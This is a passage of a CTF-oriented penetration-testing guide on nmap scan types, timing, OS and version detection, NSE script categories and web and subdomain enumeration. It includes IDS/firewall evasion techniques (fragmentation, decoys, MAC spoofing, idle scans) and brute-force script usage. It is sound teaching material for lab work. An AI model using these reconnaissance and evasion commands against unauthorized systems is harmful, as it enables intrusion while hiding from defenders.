**How it works:** ACK packets are typically used in established connections. Sending unsolicited ACKs reveals firewall configuration: unfiltered systems respond with RST; firewalls drop packets silently (filtered) or respond with ICMP unreachable (filtered).

**Interpretation:**

- **unfiltered:** RST response received — port is not blocked by firewall (but tells nothing about open/closed)
- **filtered:** No response or ICMP unreachable — firewall is blocking packets to this port
- **Cannot determine:** Port is truly filtered without additional context

**Context-specific applications:**

- **Firewall mapping:** Identify which ports/protocols the firewall permits
- **Rule enumeration:** Discover firewall ACL patterns
- **Topology reconnaissance:** Understand network segmentation without fully scanning each segment
- **Evasion assessment:** Determine if your traffic will reach internal hosts

**Example CTF scenario:**

```bash
nmap -sA -p 1-10000 192.168.1.100 | grep unfiltered
```

Identify unfiltered ports to prioritize for detailed scanning with other techniques.

---

### FIN, NULL, and Xmas Scans

These scans exploit TCP specification behavior: closed ports respond with RST to packets without SYN, ACK, or RST flags. Open ports ignore such packets (RFC 793 behavior).

**FIN Scan (`nmap -sF`):**

```bash
nmap -sF <target>
```

Sends packets with FIN flag set. Open ports drop packets silently; closed ports respond with RST.

**NULL Scan (`nmap -sN`):**

```bash
nmap -sN <target>
```

Sends packets with no flags set (TCP header flags field = 0). Same behavior as FIN scan.

**Xmas Scan (`nmap -sX`):**

```bash
nmap -sX <target>
```

Sends packets with FIN, PSH, and URG flags set (Christmas tree pattern). Same interpretation as FIN/NULL scans.

**Common parameters for all three:**

- `-sF -p 22,80,443` — Probe specific ports
- `-sF -Pn` — Assume target is alive
- `-sF -T4` — Aggressive timing
- `-sF -f` — Fragment packets (increases evasion)

**Critical limitations:**

- **Windows systems:** Do not follow RFC 793 strictly; all packets receive RST regardless of flags, making results unreliable
- **Modern firewalls:** Most stateful firewalls drop these packets or treat them identically to SYN packets
- **Unreliable:** Open|filtered results are common and provide minimal actionable intelligence

**Interpretation:**

- **open|filtered:** No response (typical for open ports; cannot definitively say)
- **closed:** RST response received
- **filtered:** ICMP unreachable or no response after retries

**Context-specific applications:**

- **Evasion scenarios:** Avoid triggering alerts on systems monitoring SYN traffic
- **Legacy system probing:** Some outdated systems strictly follow RFC 793
- **Network research:** Understanding firewall behavior with non-standard packets

**Example CTF scenario:**

```bash
nmap -sF -sN -sX 192.168.1.100 -p 1-1000
```

Run multiple scan types against same target to compare responses and infer firewall configuration.

---

### Practical CTF Integration

**Reconnaissance workflow combining multiple scan types:**

```bash
# Step 1: Quick TCP SYN scan on common ports
sudo nmap -sS --top-ports 1000 -oN tcp_common.txt 192.168.1.0/24

# Step 2: UDP scan on known services
nmap -sU -p 53,123,161,389,500 -oN udp_services.txt 192.168.1.0/24

# Step 3: Firewall assessment on suspicious port ranges
sudo nmap -sA -p 8000-9000 -oN firewall_status.txt 192.168.1.100

# Step 4: Full port enumeration on identified hosts
sudo nmap -sS -p- -sV -O --max-rate 3000 -oN full_enumeration.txt 192.168.1.100
```

### Idle/Zombie Scan Fundamentals

Idle scans exploit the predictable IP ID sequence generation of a "zombie" host to perform stealthy reconnaissance without revealing your actual IP address. The technique leverages how TCP/IP stacks increment IP identification fields.

**Basic Idle Scan Syntax:**

```bash
nmap -sI <zombie_host> <target>
nmap -sI 192.168.1.50 192.168.1.100
nmap -sI zombie.example.com -p 22,80,443 target.example.com
```

**Finding Suitable Zombie Hosts:**

```bash
# Test if a host has predictable IP ID sequence
nmap -O -v <potential_zombie>
nmap --script ipidseq <potential_zombie>

# Scan for zombies in a subnet
nmap -p 80,443 --script ipidseq 192.168.1.0/24
```

**Zombie Host Requirements:**

- Must be idle (minimal traffic)
- Must use incremental IP ID sequence (not randomized)
- Must be reachable from attacker and can reach target
- Commonly: printers, network devices, older Windows systems

**Advanced Idle Scan Parameters:**

```bash
# Specify zombie port
nmap -sI <zombie>:<port> <target>
nmap -sI 192.168.1.50:80 192.168.1.100

# Combine with other options
nmap -sI <zombie> -p- -T2 <target>
nmap -sI <zombie> -Pn --reason <target>
```

**Limitations:**

- Requires finding suitable zombie host
- Slower than direct scanning
- Less reliable with modern systems using randomized IP IDs
- May not work through certain firewalls

### Port Range Specification

**Common Port Scanning Strategies:**

```bash
# Top 100 most common ports (default)
nmap <target>

# Top 1000 ports
nmap --top-ports 1000 <target>

# Specific ports
nmap -p 22 <target>
nmap -p 22,80,443 <target>
nmap -p 80,443,8080-8090 <target>

# Port ranges
nmap -p 1-1000 <target>
nmap -p 20-25,80,443,3000-3500 <target>

# All TCP ports (1-65535)
nmap -p- <target>
nmap -p 1-65535 <target>

# UDP port specification
nmap -sU -p 53,161,162 <target>
nmap -sU --top-ports 20 <target>

# Combined TCP and UDP
nmap -p U:53,161,T:21-25,80,443 <target>
```

**Fast Scanning Strategies:**

```bash
# Quick scan (100 most common ports)
nmap -F <target>

# Scan specific service ports only
nmap -p 22,80,443,3389,445,139 <target>

# Incremental scanning approach
nmap --top-ports 100 <target>
nmap -p <discovered_ports> -sV -sC <target>
```

**Port Specification by Service Name:**

```bash
nmap -p http,https,ssh <target>
nmap -p smtp,pop3,imap <target>
```

### Timing Templates

Nmap provides six timing templates (-T0 through -T5) that control scan speed and stealth. Each template adjusts multiple timing parameters simultaneously.

**Template Overview:**

```bash
# T0: Paranoid - IDS evasion, extremely slow
nmap -T0 <target>

# T1: Sneaky - IDS evasion, very slow
nmap -T1 <target>

# T2: Polite - Reduced bandwidth, less intrusive
nmap -T2 <target>

# T3: Normal - Default timing (balanced)
nmap -T3 <target>
nmap <target>  # Same as -T3

# T4: Aggressive - Fast scan, assumes good network
nmap -T4 <target>

# T5: Insane - Very fast, may sacrifice accuracy
nmap -T5 <target>
```

**Timing Template Characteristics:**

**T0 (Paranoid):**

- Serialized scanning (one port at a time)
- 5-minute wait between probes
- Use case: Maximum stealth, IDS evasion

```bash
nmap -T0 -p 1-100 <target>
# Warning: Will take hours for small scans
```

**T1 (Sneaky):**

- Serialized scanning
- 15-second wait between probes
- Use case: Slow IDS evasion

```bash
nmap -T1 -p 1-1000 <target>
```

**T2 (Polite):**

- Slows down to consume less bandwidth
- ~0.4 second delays
- Use case: Bandwidth-constrained environments

```bash
nmap -T2 --top-ports 1000 <target>
```

**T3 (Normal):**

- Default balanced approach
- Parallel scanning enabled
- Use case: Standard reconnaissance

```bash
nmap -T3 -p- <target>
```

**T4 (Aggressive):**

- Assumes fast, reliable network
- Maximum round-trip timeout: 1.25 seconds
- Minimum round-trip timeout: 100ms
- Host timeout: 20 minutes
- Use case: CTF environments, internal networks

```bash
nmap -T4 -p- -A <target>
```

**T5 (Insane):**

- Maximum speed, minimum accuracy
- Maximum round-trip timeout: 300ms
- Host timeout: 15 minutes
- Use case: Very fast networks, time-critical scenarios

```bash
nmap -T5 --min-parallelism 100 <target>
```

**Custom Timing Parameters:**

```bash
# Manual timing control (overrides templates)
nmap --min-rtt-timeout 100ms --max-rtt-timeout 1000ms <target>
nmap --max-retries 3 --host-timeout 30m <target>
nmap --scan-delay 1s --max-scan-delay 10s <target>
nmap --min-rate 100 --max-rate 1000 <target>

# Aggressive scan with custom adjustments
nmap -T4 --max-retries 2 --host-timeout 10m <target>
```

**Practical CTF Timing Recommendations:**

```bash
# Initial discovery (fast)
nmap -T4 --min-rate 1000 -p- <target>

# Detailed enumeration (balanced)
nmap -T3 -sV -sC -p <ports> <target>

# Stealth requirement (slow)
nmap -T2 --scan-delay 2s -p <ports> <target>
```

### Service Version Detection

Version detection probes open ports to determine the exact service and version running.

**Basic Version Detection:**

```bash
# Enable version detection
nmap -sV <target>

# Version detection on specific ports
nmap -sV -p 22,80,443 <target>

# All ports with version detection
nmap -sV -p- <target>
```

**Version Detection Intensity:**

```bash
# Intensity levels: 0 (light) to 9 (all probes)
nmap -sV --version-intensity 0 <target>  # Light, fast
nmap -sV --version-intensity 5 <target>  # Default
nmap -sV --version-intensity 9 <target>  # Comprehensive, slow

# Version light (intensity 2)
nmap -sV --version-light <target>

# Version all (intensity 9)
nmap -sV --version-all <target>
```

**Practical Version Detection Combinations:**

```bash
# Fast version detection with aggressive timing
nmap -sV -T4 --version-intensity 5 <target>

# Comprehensive service enumeration
nmap -sV -sC -p- -T4 <target>

# Version detection with specific scripts
nmap -sV --script=banner,http-title,ssh-auth-methods <target>

# Version detection with OS detection
nmap -sV -O <target>
```

**Version Detection Output Interpretation:**

```bash
# Example output:
# 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
# 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
# 3306/tcp open  mysql   MySQL 5.7.38-0ubuntu0.18.04.1

# Key information extracted:
# - Service: ssh, http, mysql
# - Version: OpenSSH 8.2p1, Apache 2.4.41, MySQL 5.7.38
# - OS hints: Ubuntu (specific versions)
# - Additional info: protocol versions, modules
```

**Troubleshooting Version Detection:**

```bash
# Increase verbosity for debugging
nmap -sV -v <target>
nmap -sV -vv <target>

# Show detection attempts
nmap -sV --version-trace <target>

# Combine with reason flag
nmap -sV --reason <target>
```

**Version Detection Performance Tuning:**

```bash
# Fast scan with minimal version probes
nmap -sV --version-intensity 0 -T4 <target>

# Balanced approach for CTF
nmap -sV --version-intensity 7 -T4 -p- <target>

# Maximum information gathering
nmap -sV --version-all -T4 -A <target>
```

### OS Fingerprinting

OS detection analyzes TCP/IP stack behavior, open/closed port responses, and protocol implementation details to identify the target operating system.

**Basic OS Detection:**

```bash
# Enable OS detection
nmap -O <target>

# OS detection with version detection
nmap -O -sV <target>

# Aggressive detection (OS + version + scripts + traceroute)
nmap -A <target>
```

**OS Detection Requirements:** [Inference] OS detection typically requires:

- At least one open and one closed port
- Raw packet privileges (root/administrator)
- Direct network access (may fail through NAT/proxies)

**OS Detection Options:**

```bash
# Aggressive OS detection (if standard fails)
nmap -O --osscan-guess <target>
nmap -O --fuzzy <target>

# Maximum OS detection attempts
nmap -O --max-os-tries 5 <target>

# OS detection without port scanning
nmap -O -Pn -p- <target>

# Verbose OS detection
nmap -O -v <target>
nmap -O -vv --reason <target>
```

**Comprehensive Fingerprinting Commands:**

```bash
# Full reconnaissance with OS detection
nmap -O -sV -sC -p- -T4 <target>

# Aggressive scan with all detection methods
nmap -A -T4 -p- <target>

# Detailed OS and service fingerprinting
nmap -O -sV --version-all --osscan-guess -p- <target>

# OS detection with script scanning
nmap -O -sC --script=default,discovery <target>
```

**OS Detection Output Analysis:**

```bash
# Example output interpretation:
# Running: Linux 4.X|5.X
# OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
# OS details: Linux 4.15 - 5.6
# Network Distance: 2 hops

# Key information:
# - OS family: Linux
# - Kernel version range: 4.15 - 5.6
# - CPE identifiers for CVE searches
# - Network topology information
```

**Advanced OS Detection Techniques:**

```bash
# IPv6 OS detection
nmap -6 -O <target_ipv6>

# OS detection through firewall
nmap -O -Pn -sS -T4 <target>

# OS detection with fragment packets
nmap -O -f <target>

# Script-based OS identification
nmap --script=smb-os-discovery <target>
nmap --script=http-server-header,http-title <target>
```

**Combining Techniques for Maximum Intelligence:**

```bash
# CTF initial reconnaissance (fast)
nmap -sS -sV -O -T4 --top-ports 1000 <target>

# Comprehensive enumeration (thorough)
nmap -sS -sV -sC -O -A -p- -T4 --osscan-guess --version-all <target>

# Stealth reconnaissance (slow but quiet)
nmap -sS -sV -O -T2 -f --scan-delay 2s -p <ports> <target>

# UDP service discovery
nmap -sU -sV --top-ports 100 -T4 <target>
```

**Output Management:**

```bash
# Save results in multiple formats
nmap -oA scan_results <target>
# Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap

# Specific output formats
nmap -oN normal_output.txt <target>
nmap -oX xml_output.xml <target>
nmap -oG greppable_output.txt <target>

# Scriptable output parsing
nmap -oX - <target> | grep -i "service"
```

### Practical CTF Scanning Workflow

**Phase 1: Initial Discovery**

```bash
# Quick port discovery
nmap -sS -T4 --min-rate 1000 -p- <target> -oG quick_scan.txt

# Extract open ports
ports=$(grep -oP '\d+/open' quick_scan.txt | cut -d'/' -f1 | tr '\n' ',')
```

**Phase 2: Detailed Enumeration**

```bash
# Comprehensive service/OS detection on discovered ports
nmap -sV -sC -O -A -p $ports -T4 <target> -oA detailed_scan
```

**Phase 3: Specialized Scanning**

```bash
# Vulnerability scanning on discovered services
nmap --script=vuln -p $ports <target>

# Service-specific enumeration
nmap --script=smb-enum-shares,smb-enum-users -p 445 <target>
nmap --script=http-enum,http-methods -p 80,443 <target>
```

### Important Related Topics

For complete exploitation readiness, ensure familiarity with:

- **NSE (Nmap Scripting Engine)** - Automated vulnerability detection and exploitation
- **Firewall/IDS Evasion Techniques** - Packet fragmentation, decoys, source port manipulation
- **Banner Grabbing Alternatives** - Netcat, telnet, protocol-specific tools for manual verification
- **Service-Specific Enumeration** - SMB, SNMP, DNS, HTTP methodology for discovered services

---

## Advanced Nmap Techniques

### Script Scanning Fundamentals

Script scanning extends Nmap's capabilities beyond basic port enumeration through the Nmap Scripting Engine (NSE). The basic invocation uses `-sC` or `--script` flags.

**Basic script scan syntax:**

```bash
nmap -sC <target>
nmap --script=default <target>
```

The `-sC` flag is equivalent to `--script=default` and runs a curated collection of safe, non-intrusive scripts against discovered services.

**Category-specific scanning:**

```bash
nmap --script=<category> <target>
nmap --script=vuln,exploit <target>
nmap --script "http-*" <target>
```

Scripts can be specified by name, category, wildcard patterns, or boolean expressions.

### NSE Script Categories

NSE scripts are organized into categories based on their behavior and intrusiveness level:

**auth**: Authentication-related scripts that attempt to bypass or test authentication mechanisms

```bash
nmap --script=auth <target>
```

**broadcast**: Scripts that discover hosts through broadcast requests on local networks

```bash
nmap --script=broadcast
```

**brute**: Password brute-forcing scripts for various protocols

```bash
nmap --script=brute -p 22,3389 <target>
```

**default**: Safe, fast, and reliable scripts run with `-sC`. Includes version detection helpers, service probes, and basic information gathering

```bash
nmap -sC <target>
```

**discovery**: Scripts for discovering additional hosts, services, or network information

```bash
nmap --script=discovery <target>
```

**dos**: Denial-of-service testing scripts (use with extreme caution)

```bash
nmap --script=dos <target>  # Potentially destructive
```

**exploit**: Scripts that actively exploit vulnerabilities

```bash
nmap --script=exploit <target>  # Requires authorization
```

**external**: Scripts that send data to third-party databases or services

```bash
nmap --script=external <target>
```

**fuzzer**: Scripts that send unexpected input to services to identify vulnerabilities

```bash
nmap --script=fuzzer <target>
```

**intrusive**: Scripts that may crash services, consume significant resources, or be detected by IDS/IPS

```bash
nmap --script=intrusive <target>
```

**malware**: Scripts that detect malware infections or backdoors

```bash
nmap --script=malware <target>
```

**safe**: Scripts that are unlikely to crash services or trigger alerts

```bash
nmap --script=safe <target>
```

**version**: Enhanced version detection scripts

```bash
nmap --script=version -sV <target>
```

**vuln**: Vulnerability detection scripts that check for known CVEs

```bash
nmap --script=vuln <target>
```

**Combining categories:**

```bash
nmap --script "default and safe" <target>
nmap --script "vuln and not intrusive" <target>
nmap --script "(vuln or exploit) and not dos" <target>
```

### Custom Script Arguments

Many NSE scripts accept arguments to modify their behavior using `--script-args`.

**Single argument:**

```bash
nmap --script http-wordpress-brute --script-args http-wordpress-brute.threads=5 <target>
```

**Multiple arguments (comma-separated):**

```bash
nmap --script http-form-brute --script-args \
  http-form-brute.path=/login,http-form-brute.uservar=username,http-form-brute.passvar=password <target>
```

**Global arguments affecting multiple scripts:**

```bash
nmap --script=brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt <target>
```

**Common script argument patterns:**

For brute-forcing scripts:

```bash
nmap --script ssh-brute --script-args \
  userdb=users.txt,passdb=rockyou.txt,ssh-brute.timeout=4s -p 22 <target>
```

For HTTP scripts:

```bash
nmap --script http-enum --script-args \
  http.useragent="Mozilla/5.0",http-enum.basepath=/admin/ -p 80,443 <target>
```

For SMB scripts:

```bash
nmap --script smb-enum-shares --script-args \
  smbuser=admin,smbpass=password,smbdomain=WORKGROUP -p 445 <target>
```

**Using argument files:**

```bash
nmap --script=vuln --script-args-file args.txt <target>
```

### Output Formats

Nmap supports multiple output formats for different analysis purposes.

**Normal output (-oN)**: Human-readable text format

```bash
nmap -sV -sC -oN scan_output.txt <target>
```

**XML output (-oX)**: Machine-parseable XML format for tool integration

```bash
nmap -sV -sC -oX scan_output.xml <target>
```

XML output can be parsed by tools like `searchsploit`, converted to HTML, or processed with custom scripts.

**Grepable output (-oG)**: Deprecated but still useful format for grep/awk parsing

```bash
nmap -sV -sC -oG scan_output.gnmap <target>
```

Format: Single-line per host, easy to extract with command-line tools:

```bash
grep "80/open" scan_output.gnmap
awk '/Up$/{print $2}' scan_output.gnmap
```

**All formats (-oA)**: Outputs normal, XML, and grepable formats simultaneously

```bash
nmap -sV -sC -oA scan_results <target>
```

Creates three files: `scan_results.nmap`, `scan_results.xml`, `scan_results.gnmap`

**Additional output options:**

Append to existing file:

```bash
nmap -sV --append-output -oN existing_scan.txt <target>
```

Script kiddie output (for obfuscation):

```bash
nmap -oS 1337_output.txt <target>
```

Verbose output to file:

```bash
nmap -v -oN verbose_scan.txt <target>
```

**Converting XML to HTML:**

```bash
xsltproc scan_output.xml -o scan_output.html
```

### Fragmentation and Decoy Techniques

These techniques help evade basic firewall rules and IDS/IPS detection.

**IP fragmentation (-f, --mtu):**

Fragment packets into 8-byte chunks:

```bash
nmap -f <target>
```

Specify custom MTU (must be multiple of 8):

```bash
nmap --mtu 16 <target>
nmap --mtu 24 <target>
```

[Inference] Fragmentation can bypass simple packet filters that don't reassemble fragments before inspection, though modern firewalls typically handle fragmented packets correctly.

**Decoy scanning (-D):**

Generate decoy source addresses to obscure the real scanning source:

```bash
nmap -D RND:10 <target>  # 10 random decoys
nmap -D decoy1,decoy2,ME,decoy3 <target>  # Specific decoys, ME = your real IP
nmap -D 192.168.1.5,192.168.1.7,ME <target>
```

The target's logs will show scan attempts from all decoy IPs, making it harder to identify the actual attacker.

**Important considerations:**

- Decoys must be active on the network or routable to be effective
- Using down hosts as decoys may trigger SYN flood detection
- `ME` keyword specifies position of your real IP in the decoy list
- Without `ME`, your IP is placed randomly

**Combining fragmentation and decoys:**

```bash
nmap -f -D RND:5 -sS -p- --min-rate 1000 <target>
```

**Additional evasion techniques:**

Randomize target scan order:

```bash
nmap --randomize-hosts -iL targets.txt
```

Add random delays between probes:

```bash
nmap --scan-delay 2s <target>
nmap --max-scan-delay 5s <target>
```

Spoof source MAC address (requires root):

```bash
nmap --spoof-mac 0 <target>  # Random MAC
nmap --spoof-mac Apple <target>  # Vendor-specific
nmap --spoof-mac 00:11:22:33:44:55 <target>  # Specific MAC
```

Use bad checksums (tests for firewall):

```bash
nmap --badsum <target>
```

If responses are received, the firewall is not validating checksums and responses are likely from the firewall itself, not the target.

**Source port specification:**

Some firewalls allow traffic from specific source ports (DNS=53, HTTP=80):

```bash
nmap --source-port 53 <target>
nmap -g 53 <target>  # Equivalent syntax
```

**Practical CTF scanning workflow:**

Initial reconnaissance with evasion:

```bash
nmap -sS -sV -sC -f -D RND:5 --randomize-hosts --min-rate 300 -oA initial_scan <target>
```

Targeted vulnerability assessment:

```bash
nmap --script "vuln and safe" -sV -p $(cat open_ports.txt) -oX vuln_scan.xml <target>
```

Comprehensive enumeration with custom scripts:

```bash
nmap --script "http-enum,http-vuln-*,http-shellshock" \
  --script-args http.useragent="Mozilla/5.0" \
  -p 80,443,8080 -oA web_scan <target>
```

**Important subtopics for CTF scenarios:**

- NSE script development and customization
- Timing templates and performance optimization (`-T0` through `--T5`)
- Firewall/IDS detection and adaptation (`-sA`, `-sW`, `-sM`)
- IPv6 scanning considerations (`-6`)
- Scripting automated reconnaissance workflows

---

# PORT & SERVICE ENUMERATION

## Web Service Enumeration (HTTP/HTTPS)

### Banner Grabbing

**telnet** provides direct TCP connection to HTTP services, allowing manual banner observation and basic protocol testing:

```bash
telnet 192.168.1.100 80
```

After connection, send HTTP request:

```
GET / HTTP/1.1
Host: 192.168.1.100
Connection: close

```

Press Enter twice to complete the request. The server response includes HTTP status line and headers containing version information. [Inference] This method reveals headers in raw form but may be blocked by modern firewalls.

**nc (netcat)** provides similar functionality with better timeout handling:

```bash
nc -v 192.168.1.100 80
```

Send HTTP request through pipe:

```bash
echo -e "GET / HTTP/1.1\r\nHost: 192.168.1.100\r\nConnection: close\r\n\r\n" | nc 192.168.1.100 80
```

The `-v` flag provides verbose output indicating connection status. Add timeout with `-w`:

```bash
nc -v -w 5 192.168.1.100 80
```

**curl -v** performs HTTP requests with verbose header output:

```bash
curl -v http://192.168.1.100/
```

The output shows request headers (prefixed with `>`), response headers (prefixed with `<`), and response body. Follow redirects:

```bash
curl -v -L http://192.168.1.100/
```

Suppress response body while showing headers:

```bash
curl -v -o /dev/null http://192.168.1.100/
```

Test specific HTTP versions:

```bash
curl -v --http1.0 http://192.168.1.100/
curl -v --http1.1 http://192.168.1.100/
curl -v --http2 https://192.168.1.100/
```

Test HEAD request to avoid downloading full response:

```bash
curl -v -I http://192.168.1.100/
```

**nmap -sV** performs service version detection through probe responses:

```bash
nmap -sV 192.168.1.100 -p 80,443,8080
```

Aggressive version detection with multiple probes:

```bash
nmap -sV --version-intensity 9 192.168.1.100 -p 80,443
```

Version intensity ranges from 0-9; higher values send more probes but require more time. Combine with OS detection:

```bash
nmap -O -sV 192.168.1.100 -p 80,443
```

### Directory Enumeration

**dirbuster** performs HTTP GET requests against wordlist-derived paths. GUI interface provides real-time progress visualization:

```bash
dirbuster
```

Command-line mode (if available):

```bash
dirbuster -H -u http://192.168.1.100/ -l /usr/share/wordlists/dirb/common.txt -t 50
```

The `-H` flag uses HEAD requests (faster than GET), `-u` specifies URL, `-l` specifies wordlist, and `-t` sets thread count. [Unverified] dirbuster is less maintained than contemporary alternatives and may have compatibility issues with modern web servers.

**gobuster** provides fast directory enumeration with multiple modes. Basic directory scan:

```bash
gobuster dir -u http://192.168.1.100/ -w /usr/share/wordlists/dirb/common.txt
```

Add status code filtering to show only successful responses:

```bash
gobuster dir -u http://192.168.1.100/ -w /usr/share/wordlists/dirb/common.txt -s 200,204,301,302,307,401,403
```

The `-s` flag specifies status codes to display. Extensions to test:

```bash
gobuster dir -u http://192.168.1.100/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
```

Threads and timeout configuration:

```bash
gobuster dir -u http://192.168.1.100/ -w /usr/share/wordlists/dirb/common.txt -t 100 -timeout 10s
```

Hide specific status codes:

```bash
gobuster dir -u http://192.168.1.100/ -w /usr/share/wordlists/dirb/common.txt -b 404,403
```

Recursive scanning (discovers directories then enumerates within each):

```bash
gobuster dir -u http://192.168.1.100/ -w /usr/share/wordlists/dirb/common.txt -r
```

**ffuf** (Fuzz Faster U Fool) combines directory enumeration with flexible fuzzing capabilities:

```bash
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

The `FUZZ` keyword marks injection points. Filter responses by status code:

```bash
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403
```

The `-mc` flag specifies match codes. Exclude status codes:

```bash
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404,403
```

Filter by response size (useful for identifying default pages vs. legitimate directories):

```bash
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 1234
```

Multiple wordlists with multiple FUZZ keywords:

```bash
ffuf -u http://192.168.1.100/FUZZ1/FUZZ2 -w wordlist1.txt:FUZZ1 -w wordlist2.txt:FUZZ2
```

Request rate limiting (avoid overwhelming target):

```bash
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -rate 50
```

Output results in JSON format:

```bash
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -of json -o results.json
```

**wfuzz** provides similar functionality with different parameter syntax. Basic directory enumeration:

```bash
wfuzz -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

The `FUZZ` keyword is replaced by wordlist entries. Filter by status code:

```bash
wfuzz -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt --sc 200,301,302
```

Hide specific status codes:

```bash
wfuzz -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 404,403
```

Multiple fuzzing points:

```bash
wfuzz -u http://192.168.1.100/FUZZ1/FUZZ2 -w wordlist1.txt -w wordlist2.txt
```

Test HTTP methods with wfuzz:

```bash
wfuzz -u http://192.168.1.100/ -w methods.txt -X FUZZ
```

Cookie injection:

```bash
wfuzz -u http://192.168.1.100/ -w wordlist.txt -b "sessionid=FUZZ"
```

### Virtual Host Enumeration

**gobuster vhost** identifies virtual hosts on multi-tenant web servers. Basic enumeration:

```bash
gobuster vhost -u http://192.168.1.100/ -w /usr/share/wordlists/subdomains-top1million-5000.txt
```

Add domain specification:

```bash
gobuster vhost -u http://192.168.1.100/ -w /usr/share/wordlists/subdomains-top1million-5000.txt -d example.com
```

Filter results by status code:

```bash
gobuster vhost -u http://192.168.1.100/ -w /usr/share/wordlists/subdomains-top1million-5000.txt -s 200
```

Threads configuration:

```bash
gobuster vhost -u http://192.168.1.100/ -w /usr/share/wordlists/subdomains-top1million-5000.txt -t 100
```

[Inference] Virtual hosts often respond to any Host header with content, requiring filtering based on response size or specific page content rather than HTTP status codes.

**ffuf** for virtual host discovery uses response-size filtering effectively:

```bash
ffuf -u http://192.168.1.100/ -w /usr/share/wordlists/subdomains-top1million-5000.txt -H "Host: FUZZ.example.com" -fs 4242
```

The `-H` flag adds custom headers with FUZZ keyword. Discover default vs. vhost responses:

```bash
curl -I http://192.168.1.100/
curl -I -H "Host: admin.example.com" http://192.168.1.100/
```

Compare response sizes to identify different content. Advanced filtering by response word count:

```bash
ffuf -u http://192.168.1.100/ -w /usr/share/wordlists/subdomains-top1million-5000.txt -H "Host: FUZZ.example.com" -fw 150
```

The `-fw` flag filters by word count in response body.

### Subdomain Discovery

**nslookup** performs iterative DNS queries for subdomain discovery. Zone transfer attempt (typically blocked on modern DNS servers):

```bash
nslookup -type=AXFR example.com ns1.example.com
```

If successful (rare), returns all DNS records for the domain. Otherwise, perform manual subdomain queries:

```bash
nslookup subdomain.example.com
```

Batch query from wordlist:

```bash
while read subdomain; do nslookup "$subdomain.example.com" 2>/dev/null | grep -v "NXDOMAIN"; done < subdomains.txt
```

**dig** provides similar functionality with better output parsing:

```bash
dig example.com AXFR
```

Zone transfer (rarely permitted):

```bash
dig @ns1.example.com example.com AXFR
```

Query MX records (reveals mail servers, often leading to additional infrastructure):

```bash
dig example.com MX
```

Query NS records (nameservers):

```bash
dig example.com NS
```

Reverse lookup to discover subdomains:

```bash
dig -x 192.168.1.100
```

Batch subdomain queries with shell loop:

```bash
while read subdomain; do dig "$subdomain.example.com" +short; done < subdomains.txt | grep -v "^$"
```

**amass** performs comprehensive subdomain discovery through multiple data sources (DNS, certificate transparency, web crawling):

```bash
amass enum -d example.com
```

Active enumeration (performs DNS queries):

```bash
amass enum -d example.com -active
```

Passive enumeration (queries public data sources only):

```bash
amass enum -d example.com -passive
```

Output to file:

```bash
amass enum -d example.com -o subdomains.txt
```

Increase verbosity:

```bash
amass enum -d example.com -v
```

Exclude specified domains:

```bash
amass enum -d example.com -exclude cdn.example.com,api.cdn.example.com
```

Specific DNS resolver configuration:

```bash
amass enum -d example.com -r 8.8.8.8,8.8.4.4
```

**subfinder** focuses on certificate transparency and OSINT data for rapid subdomain discovery:

```bash
subfinder -d example.com
```

Output results:

```bash
subfinder -d example.com -o subdomains.txt
```

Recursive enumeration (discovers subdomains of discovered subdomains):

```bash
subfinder -d example.com -recursive
```

Increase thread count for faster enumeration:

```bash
subfinder -d example.com -t 200
```

Use specific resolvers:

```bash
subfinder -d example.com -r 8.8.8.8,8.8.4.4
```

### Web Server Identification

**httprint** fingerprints web servers through HTTP response characteristics:

```bash
httprint -h 192.168.1.100:80 -s /usr/share/httprint/signatures.txt
```

The `-h` specifies target and port, `-s` specifies signature database. Verbose output:

```bash
httprint -h 192.168.1.100:80 -s /usr/share/httprint/signatures.txt -v
```

[Unverified] httprint signature database may require updates for modern web server versions.

**curl** reveals server information through response headers:

```bash
curl -I http://192.168.1.100/
```

The `Server:` header typically identifies web server software. Extract specific header:

```bash
curl -I http://192.168.1.100/ | grep -i "Server:"
```

Test multiple endpoints:

```bash
curl -I http://192.168.1.100/
curl -I http://192.168.1.100/index.html
curl -I http://192.168.1.100/admin/
```

Different endpoints sometimes reveal different server information. Check error pages:

```bash
curl -I http://192.168.1.100/nonexistent
```

Error page formatting often reveals server type.

**Wappalyzer** identifies technologies through browser extension or CLI:

```bash
npm install -g wappalyzer
wappalyzer https://example.com
```

Output displays detected technologies including server, frameworks, libraries, and CMS platforms. [Unverified] Wappalyzer's detection accuracy depends on updated fingerprints; some technologies may be misidentified.

Manual header analysis provides the most reliable identification. Key indicators include:

- Server header format and version disclosure
- X-Powered-By header (reveals backend technology)
- X-AspNet-Version (ASP.NET applications)
- Set-Cookie naming patterns (PHP: PHPSESSID, ASP.NET: ASPSESSIONID, Java: JSESSIONID)

### SSL/TLS Certificate Analysis

**openssl s_client** performs direct TLS connection and displays certificate information:

```bash
openssl s_client -connect 192.168.1.100:443
```

Extract certificate details without interactive connection:

```bash
openssl s_client -connect 192.168.1.100:443 < /dev/null
```

Display certificate in text format:

```bash
openssl s_client -connect 192.168.1.100:443 < /dev/null | openssl x509 -text -noout
```

Extract subject alternative names (SANs):

```bash
openssl s_client -connect 192.168.1.100:443 < /dev/null | openssl x509 -text -noout | grep -A1 "Subject Alternative Name"
```

SANs often reveal subdomains and virtual hosts. Check certificate expiration:

```bash
openssl s_client -connect 192.168.1.100:443 < /dev/null | openssl x509 -noout -dates
```

Extract and save certificate:

```bash
